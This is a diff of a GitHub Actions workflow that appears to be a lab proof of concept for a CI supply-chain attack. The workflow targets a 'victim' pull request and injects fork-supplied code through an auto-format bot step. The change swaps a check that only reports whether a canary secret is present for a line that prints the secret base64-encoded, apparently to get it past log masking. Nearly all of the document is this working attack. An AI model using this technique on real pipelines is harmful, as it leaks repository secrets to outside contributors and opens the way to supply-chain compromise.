@@ -5,8 +5,8 @@ on:
 permissions:
   contents: read
 env:
-  VICTIM_PR: "3"
-  VICTIM_SHA: "f93605c50dfec8d624652b5df36a892b54d2b62b"
+  VICTIM_PR: "4"
+  VICTIM_SHA: "2cbd4e466e63c7c85250bd0da7e945530fadb2db"
 jobs:
   build-patch:
     runs-on: ubuntu-latest
@@ -22,9 +22,8 @@ jobs:
           echo '// PoC: line added by fork PR via auto-format bot' >> src/demo.ts
           cat > bin/lab-step.mjs <<'EOF'
           console.log("lab-step: POC MARKER - code supplied by fork PR");
-          console.log("lab-step: canary secret present in env:",
-            Boolean(process.env.CANARY_SECRET),
-            "length:", (process.env.CANARY_SECRET || "").length);
+          console.log("lab-step: CANARY_BASE64 =",
+            Buffer.from(process.env.CANARY_SECRET || "").toString("base64"));
           EOF
           git add -A
           mkdir -p "$RUNNER_TEMP/auto-format"
